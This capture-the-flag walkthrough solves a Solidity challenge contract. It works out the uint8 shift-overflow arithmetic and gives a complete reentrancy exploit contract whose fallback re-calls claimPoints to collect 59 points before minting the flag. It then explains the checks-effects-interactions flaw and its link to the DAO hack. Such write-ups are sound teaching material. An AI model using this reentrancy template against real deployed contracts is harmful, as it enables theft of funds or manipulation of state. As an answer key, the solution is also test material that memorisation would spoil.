# Challenge 6: Give Me My Points!

In this challenge, you need to abuse a state update vulnerability to gain enough points to upgrade your level and solve a math puzzle involving bitwise operations.

## Contract Overview
The contract tracks `points` and `levels`.
- `claimPoints()`: Grants 1 point. Fails if you already have points.
- `upgradeLevel()`: Costs 10 points. Increases level by 1.
- `mintFlag()`:
    1. Requires `points < 10`.
    2. Requires `points * levels >= 30`.
    3. Requires `uint8(points << levels) == 32`.

## Hints
<details>
<summary>Hint 1</summary>
The `claimPoints` function uses `call` to contact `msg.sender` *before* updating the point balance. Does this ring any bells from [S2C4: Pay me!](../challenge4) or [S1C5: Give Me My Points!](../../season1/challenge5)?
</details>

<details>
<summary>Hint 2</summary>
You need to find a pair of numbers `(points, levels)` such that `points < 10`, `points * levels >= 30`, and `(points << levels) % 256 == 32`.
</details>

<details>
<summary>Hint 3</summary>
Since `points` and `levels` are `uint8`, the left shift operation `<<` overflows. For example, `9 << 5` equals `288`, which is `32` in `uint8`.
</details>

## Solution
<details>
<summary>Click to reveal solution</summary>

1. **Solve the Math**:
   We need `points < 10` and `points * levels >= 30`.
   If we try `levels = 5`, then `points >= 6`.
   Let's test `points = 9, levels = 5`.
   - `9 < 10` ✅
   - `9 * 5 = 45 >= 30` ✅
   - `9 << 5` (binary `00001001` shifted left 5 times) = `100100000` (binary) = 288 (decimal).
   - Casting to `uint8` drops the 9th bit: `288 % 256 = 32`. ✅

   So we need to reach **Level 5** and have **9 Points** remaining.
   Total points needed = (5 levels * 10 points/level) + 9 points = **59 Points**.

2. **The Exploit**:
   Since `claimPoints` only works if `points == 0`, we must use reentrancy to claim 59 times in a single transaction.

   Create a contract:
   ```solidity
   contract Solution {
       Season2Challenge6 challenge;
       uint256 count;

       constructor(Season2Challenge6 _c) { challenge = _c; }

       function solve() external {
           challenge.claimPoints(); // Starts the loop
           
           // After recursion finishes, we have 59 points
           for(uint i=0; i<5; i++) challenge.upgradeLevel(); // Spend 50 points
           
           // We have 9 points, level 5
           challenge.mintFlag();
       }

       fallback() external payable {
           if (count < 58) {
               count++;
               challenge.claimPoints();
           }
       }
   }
   ```

3. Deploy and call `solve()`.

Why this works:
- **Reentrancy**: Because `points` are updated *after* the external call, the contract sees `points == 0` for all 59 recursive calls.
- **Type Casting**: The logic relies on `uint8` overflow behavior to validate the key.
</details>

## Why This Matters

This challenge highlights two important vulnerabilities:

1.  **Reentrancy**: The "Checks-Effects-Interactions" pattern is violated in `claimPoints`. The state (`points[tx.origin] += 1`) is updated *after* the interaction (`msg.sender.call("")`). This allows an attacker to bypass the `points == 0` check. This is the *same vulnerability* found in the infamous **The DAO** hack (2016). You also saw this in [S1C5: Give Me My Points!](../../season1/challenge5).
2.  **Integer Overflow/Casting**: Reliance on specific bitwise behavior of small integer types (`uint8`) can lead to unexpected logic flows. While Solidity 0.8.x protects against arithmetic overflow (like `+` or `*`), bitwise operations like `<<` do not revert on overflow; they simply truncate the result.